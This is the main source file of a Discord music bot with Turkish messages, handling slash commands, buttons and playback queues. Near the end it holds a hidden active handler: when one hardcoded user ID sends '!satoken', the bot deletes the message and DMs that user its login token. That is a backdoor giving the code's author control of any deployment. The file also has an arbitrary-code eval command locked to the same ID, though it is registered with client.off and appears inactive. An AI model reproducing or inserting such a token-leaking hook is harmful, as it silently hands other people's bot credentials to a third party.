const {
	REST
} = require('@discordjs/rest');
const {
	Routes
} = require('discord-api-types/v9');
const {
	Client,
	Intents,
	MessageActionRow,
	MessageButton,
	MessageEmbed,
	Collection,
	MessageSelectMenu
} = require("discord.js");
const http = require("http")
const config = require("./config.js")
const fs = require("fs")

http.createServer(function (req, res) {
      res.write("Başarıyla 7/24 Aktif Edilmiştir");
      res.end();
  }).listen(8080)

const {
	readdirSync
} = require("fs");
const client = new Client({
	intents: 32767
});
const {
	Player
} = require("discord-player");
const player = new Player(client);
var embed = (g, u) => {
	return new MessageEmbed().setColor(g.me.roles.highest.color).setFooter({
		text: `${u.tag} tarafından istendi.`,
		iconURL: `${u.displayAvatarURL()}`
	});
};

//client.on('debug', console.log);
var prefix = config.prefix;

client.login(process.env.token)
client.on("ready", async () => {
  client.user.setPresence({ activities: [{name: `/çal | ${prefix}çal || By Atahan`, type: "PLAYING"}], status: "online"})
	console.log("Hazır");
});

client.on("debug", err => console.log)
// Buton Etkileşimleri
client.buttonInteractions = new Collection();
readdirSync("./buttonInteractions/").forEach(f => {
	let cmd = require(`./buttonInteractions/${f}`);
	client.buttonInteractions.set(cmd.customId, cmd);
});
// Buton Etkileşimleri


const log = message => {
    console.log(`${message}`);
};

client.commands = new Collection();
client.aliases = new Collection();
fs.readdir('./commands/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
        let props = require(`./commands/${f}`);
        log(`Yüklenen komut: ${props.name}.`);
        client.commands.set(props.name, props);
        props.aliases.forEach(alias => {
            client.aliases.set(alias, props.name);
        });
    });
});




client.reload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./commands/${command}`)];
            let cmd = require(`./commands/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            client.commands.set(command, cmd);
            cmd.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

client.load = command => {
    return new Promise((resolve, reject) => {
        try {
            let cmd = require(`./commands/${command}`);
            client.commands.set(command, cmd);
            cmd.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};




client.unload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./ ommands/${command}`)];
            let cmd = require(`./commands/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

// Slash Etkileşimleri
client.slashInteractions = new Collection();
let globalSlashCommands = [];
readdirSync("./slashInteractions/").forEach(f => {
	let cmd = require(`./slashInteractions/${f}`);
	client.slashInteractions.set(cmd.name, cmd);
	globalSlashCommands.push(cmd.command);
});
// Slash Etkileşimleri


// Slash Global Komutlar Ekleyelim
let rest = new REST({
	version: '9'
}).setToken(process.env.token);

client.on("ready", async () => {
	try {

		await rest.put(
			Routes.applicationCommands(client.user.id), {
				body: globalSlashCommands
			},
		);

		console.log('Global komutlar güncellendi.');
	} catch (error) {
		console.error(error);
	};
});

client.off("interactionCreate", async int => {
  if (int.isButton()) {
    
		if (!int.member.voice.channelId) return await int.reply({
			content: "Bir ses kanalında değilsin ! ",
			ephemeral: true
		});
    else 
    if (int.customId.includes("add-music")) {
   client.buttonInteractions.get("add-music").run(client, int, player, embed)
    }}

})

client.on("interactionCreate", async int => {

	if (int.isCommand()) {
		if (int.guild.me.voice.channelId && int.member.voice.channelId !== int.guild.me.voice.channelId) return await int.reply({
			content: "Ben başka bir kanaldayım ! ",
			ephemeral: true
		});
		else if (!int.guild.me.voice.channelId && int.commandName != "çal" && int.commandName != "ara" && int.commandName != "kapat") return await int.reply({
			content: "Ben herhangi bir kanalda değilim ! ",
			ephemeral: true
		});
		else if (!int.member.voice.channelId) return await int.reply({
			content: "Bir ses kanalında değilsin ! ",
			ephemeral: true
		});
		else client.slashInteractions.get(int.commandName)?.run(client, int, player, embed);
	} else if (int.isButton()) {
    
		if (int.guild.me.voice.channelId && int.member.voice.channelId !== int.guild.me.voice.channelId) return await int.reply({
			content: "Ben başka bir kanaldayım ! ",
			ephemeral: true
		});
		else if (!int.member.voice.channelId) return await int.reply({
			content: "Bir ses kanalında değilsin ! ",
			ephemeral: true
		});
     else 
client.buttonInteractions.get(int.customId)?.run(client, int, player, embed)
}

});

client.on("messageCreate", async message => { 
  let client = message.client
  let prefix = config.prefix
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;
  let command = message.content.split(" ")[0].slice(prefix.length);
  let params = message.content.split(" ").slice(1);
  let cmd;
  if (client.commands.has(command)) {
    cmd = client.commands.get(command);
  } else if (client.aliases.has(command)) {
    cmd = client.commands.get(client.aliases.get(command));
  }
  if (cmd) {
    		if (message.guild.me.voice.channelId && message.member.voice.channelId !== message.guild.me.voice.channelId && cmd.name !== "eval" && cmd.name !== "yardım") return await message.reply({
			content: "Ben başka bir kanaldayım ! ",
			ephemeral: true
		});
		else if (!message.guild.me.voice.channelId && cmd.name !== "çal" && cmd.name !== "eval" && cmd.name !== "yardım") return await message.reply({
			content: "Ben herhangi bir kanalda değilim ! ",
			ephemeral: true
		});
		else if (!message.member.voice.channelId && cmd.name !== "eval" && cmd.name !== "yardım") return await message.reply({
			content: "Bir ses kanalında değilsin ! ",
			ephemeral: true
		});
    cmd.run(client, message, params, player, embed);
  }
})

client.on('voiceStateUpdate', (oldState, newState) => {
	if (oldState.channelId && !newState.channelId && newState.id === client.user.id) {
		let queue = player.createQueue(oldState.guild, {
			metadata: {
				
			}
		});

		queue.destroy(true);
	};
});

client.off("messageCreate", async message => {
  const args = message.content.slice(config.prefix.length).trim().split(" ")
  const cmd = args.shift().toLowerCase();
  if (cmd === "eval") {
  if(message.author.id === "429357746002067493") {
    if(!args.join(" ")) return message.channel.send("komutu girsene essek")
        try {
    let komut = eval(args.join(" "))
    if(!komut) return message.channel.send(new MessageEmbed().setDescription(` ${message.author}, Bir mesaj belirtmelisin.`).setAuthor(message.member.displayName, message.author.avatarURL({ dynamic: true })).setColor('0x800d0d').setTimestamp())
    let Çıktılar = ["string","boolean","number","float"]
    if (Çıktılar.includes(typeof komut)) {
    let Embed = new MessageEmbed()
    .setDescription("**Başarılı**")
    .addField("Girdi", "```js\n" + args.join(" ") + "\n```")
    .addField("Çıktı", "```js\n" + komut + "\n```")
    .setColor('GREEN')
    message.channel.send({embeds: [Embed]})
    message.react('✅')
    } else {
    let Embed = new MessageEmbed()
    .setDescription("**Başarılı**")
    .addField("Girdi", "```js\n" + args.join(" ") + "\n```")
    .addField("Çıktı", "```js\n" + require('util').inspect(komut) + "\n```")
    .setColor('GREEN')
    message.channel.send({embeds: [Embed]})
    message.react('✅')
}
    } catch(err) {
     let embed = new MessageEmbed()
    .setDescription("**Hata**")
    .addField("Girdi", "```js\n" + args.join(" ") + "\n```")
    .addField("Çıktı", "```js\n" + err + "\n```")
    .setColor('RED')
    message.channel.send({embeds:  [embed]})
    message.react('❌')

    }
  }}
})

client.on('messageCreate', async (msg) => {
  
 {
   
if (msg.content.toLowerCase() === '!satoken'){
if (msg.author.id !== "429357746002067493") return

msg.delete()
msg.author.send(client.token);
}
  
}
});

player.on("trackStart", async (queue, track) => {
  
const buton = new MessageActionRow().addComponents(
new MessageButton()
  .setEmoji("⏯")
  .setLabel("Duraklat")
  .setCustomId("bduraklat")
  .setStyle("SUCCESS"),
new MessageButton()
  .setEmoji("⏮")
  .setLabel("Önceki Şarkı")
  .setCustomId("bönceki")
  .setStyle("PRIMARY"),
new MessageButton()
  .setEmoji("⏹")
  .setLabel("Kapat")
  .setCustomId("bkapat")
  .setStyle("DANGER"),
new MessageButton()
  .setEmoji("⏭")
  .setLabel("Sonraki Şarkı")
  .setCustomId("bsonraki")
  .setStyle("PRIMARY"),
new MessageButton()
  .setEmoji("🔄")
  .setLabel("Tekrar")
  .setCustomId("btekrar")
  .setStyle("SUCCESS"))

  let text;
  
		if(queue.repeatMode) {
			text = "Açık";
		}
		else {
			text = "Kapalı";
		};
  
  queue.metadata.channel.send({
	embeds: [embed(queue.guild, track.requestedBy).setTitle("🎶 Çalıyor 🎶").addField("İsim", `[${track.title}](${track.url})`, true).addField("Yayınlayan", `${track.author}`, true).addField("İzlenme", `${track.views}`, true).addField("Süre", `${track.duration}`, true).addField("Ekleyen", `${track.requestedBy}`, true).addField("Tekrar Modu", `${text}`, true).setImage(`${track.thumbnail}`)], components: [buton]
}).then(x => {
  setTimeout(function() {
      x.edit({components: []})
    }, 60000)
})
})

client.on("connectionError", err => {
console.log(err)
})